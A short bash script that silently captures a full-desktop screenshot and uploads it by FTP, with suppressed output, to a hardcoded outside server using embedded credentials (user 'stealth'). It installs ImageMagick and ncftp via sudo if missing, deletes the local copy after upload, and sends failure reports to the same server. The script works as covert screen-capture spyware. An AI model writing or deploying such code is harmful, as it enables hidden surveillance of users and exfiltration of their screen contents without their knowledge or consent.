#!/bin/bash
#
# @author J. Pavel Espinal, jose@pavelespinal.com
# 

# Random file name
current_time="`date +%F_%Hh%Mm%Ss`"
file_name="/tmp/${HOSTNAME}_${current_time}.jpg"
ftp_user='stealth@asteriskfaqs.org'
ftp_pass='st34lthp4ss'
ftp_server='asteriskfaqs.org'


# Function to test if a binary is present on the system
function isPresent {
	if [ -z "`dpkg --get-selections | grep -i "$1" | cut -f1`" ]; then
		ls "$RANDOM $RANDOM" 2>/dev/null 1>&2
	else
		ls . 1>/dev/null 2>&1
	fi
}

# Function to send generated file
#function sendMail {
#	mutt -s "${HOSTNAME} machine screenshot at [${subject_date}]" -a /tmp/${file_name} -c "${ccrecipient}" -- ${recipient} </dev/null 
#}

# Function to create screenshot
function createImg {
	import -window root -compress JPEG -strip -resize 85% -quality 75 ${file_name}
#	echo 'Image created'
}

function cleanAll {
	rm -rf ${file_name}
#	echo 'Image deleted'
}

function uploadFile {
#	echo 'Uploading image'
	ncftpput -u ${ftp_user} -p ${ftp_pass} ${ftp_server} / ${file_name} 1>/dev/null 2>&1
#	echo 'Image uploaded'
}

function reportFail {
	report_file="${file_name}.txt"
	echo "There was a problem creating ${file_name} at ${1} time" > "/tmp/${report_file}"
	ncftpput -u ${ftp_user} -p ${ftp_pass} -p ${ftp_server} / ${report_file} 1>/dev/null 2>&1
	rm -rf /tmp/${report_file}
#	echo 'Report created'
}

# Is imagemagick present?
isPresent "imagemagick";

if [ $? != 0 ]; then
	echo "Imagemagic needs to be installed"
	sudo apt-get install imagemagick -y
fi

# Is ncftp package present?
isPresent "ncftp";

if [ $? != 0 ]; then
	echo "ncftp needs to be installed"
	sudo apt-get install ncftp -y
fi

# Creating screenshot
if ! (createImg); then
	reportFail 'create'
fi

# Uploading File 
if (uploadFile); then 
	# Cleaning before exiting
	cleanAll;
else
	reportFail 'upload';
fi
